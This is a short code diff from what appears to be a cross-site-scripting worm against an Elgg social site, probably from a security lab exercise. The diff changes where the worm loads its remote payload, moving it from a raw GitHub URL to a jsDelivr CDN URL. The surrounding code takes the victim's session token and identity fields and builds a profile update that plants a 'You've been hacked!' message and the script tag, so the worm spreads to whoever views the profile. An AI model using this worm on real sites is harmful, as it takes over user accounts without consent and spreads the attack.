@@ -6,7 +6,7 @@ window.onload = function() {
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
 
     // Construct the worm script link
-    var wormScriptTag = "<script src='https://raw.githubusercontent.com/mehtaaryan1999/lecture0/refs/heads/master/orm.js'></" + "script>";
+    var wormScriptTag = "<script src='https://cdn.jsdelivr.net/gh/mehtaaryan1999/lecture0/orm.js'></" + "script>";
 
     // Construct the content to modify the profile
     var profileUpdateContent = token + ts + userName + guid + "&description=You’ve been hacked! " + encodeURIComponent(wormScriptTag) + "&accesslevel[description]=2";
